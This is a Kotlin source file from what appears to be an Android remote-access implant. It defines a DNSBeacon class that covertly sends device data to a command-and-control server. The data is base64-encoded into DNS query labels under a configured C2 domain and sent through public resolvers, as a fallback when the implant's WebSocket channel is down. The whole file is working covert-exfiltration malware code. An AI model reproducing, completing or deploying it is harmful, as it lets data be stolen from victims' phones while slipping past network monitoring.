// ============================================================
// FILE: android/app/src/main/java/com/xrc/comms/DNSBeacon.kt
// ============================================================
package com.xrc.comms

import android.content.Context
import android.util.Base64
import android.util.Log
import com.xrc.core.config.XrcConfig
import kotlinx.coroutines.*
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress

/**
 * DNSBeacon — DNS tunneling beacon for outbound communication.
 *
 * Encodes data into DNS queries to the C2's DNS server.
 * Used as fallback when WebSocket is unavailable.
 *
 * Format: base64(data).subdomain.domain
 * Max label length: 63 characters (per DNS spec)
 *
 * Note: DNS is a one-way channel (device → C2).
 * Commands from C2 are polled via HTTP.
 */
class DNSBeacon(
    private val context: Context,
    private val config: XrcConfig
) {
    companion object {
        private const val TAG = "DNSBeacon"
        private const val MAX_LABEL_LENGTH = 63
        private val dnsServers = listOf(
            "8.8.8.8",       // Google
            "1.1.1.1",       // Cloudflare
            "208.67.222.222" // OpenDNS
        )
    }

    private var running = false
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Send data via DNS query to C2 domain.
     */
    fun send(data: String): Boolean {
        if (!config.channels.dns_enabled) return false

        return try {
            val domain = config.c2.dns_domain
            val encoded = Base64.encodeToString(
                data.toByteArray(Charsets.UTF_8),
                Base64.NO_WRAP or Base64.URL_SAFE
            )

            // Split into chunks of MAX_LABEL_LENGTH
            val chunks = encoded.chunked(MAX_LABEL_LENGTH)
            for (chunk in chunks) {
                val query = "$chunk.$domain"
                sendDnsQuery(query)
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "DNS send failed: ${e.message}")
            false
        }
    }

    /**
     * Send a raw DNS query to a public DNS resolver.
     */
    private fun sendDnsQuery(query: String) {
        try {
            val socket = DatagramSocket()
            val packet = buildDnsQueryPacket(query)
            for (server in dnsServers) {
                socket.send(DatagramPacket(
                    packet, packet.size,
                    InetAddress.getByName(server), 53
                ))
            }
            socket.close()
        } catch (e: Exception) {
            Log.v(TAG, "DNS query failed: ${e.message}")
        }
    }

    /**
     * Build a minimal DNS query packet for an A record.
     */
    private fun buildDnsQueryPacket(domain: String): ByteArray {
        val transactionId = (System.currentTimeMillis() % 65535).toInt()
        val labels = domain.split(".")

        val buffer = ByteArrayOutputStream()
        // Transaction ID (2 bytes)
        buffer.write(transactionId shr 8)
        buffer.write(transactionId and 0xFF)
        // Flags: standard query, recursion desired
        buffer.write(0x01); buffer.write(0x00)
        // Questions: 1
        buffer.write(0x00); buffer.write(0x01)
        // Answer RRs: 0, Authority RRs: 0, Additional RRs: 0
        buffer.write(0x00); buffer.write(0x00)
        buffer.write(0x00); buffer.write(0x00)
        buffer.write(0x00); buffer.write(0x00)

        // Query name (labels)
        for (label in labels) {
            buffer.write(label.length)
            for (ch in label) {
                buffer.write(ch.code)
            }
        }
        buffer.write(0x00) // Terminate QNAME

        // QTYPE: A (1)
        buffer.write(0x00); buffer.write(0x01)
        // QCLASS: IN (1)
        buffer.write(0x00); buffer.write(0x01)

        return buffer.toByteArray()
    }

    fun isRunning(): Boolean = running
    fun stop() { running = false; scope.cancel() }
}

class ByteArrayOutputStream {
    private val data = mutableListOf<Byte>()
    fun write(b: Int) { data.add(b.toByte()) }
    fun write(byteArray: ByteArray) { data.addAll(byteArray.toList()) }
    fun toByteArray(): ByteArray = data.toByteArray()
}
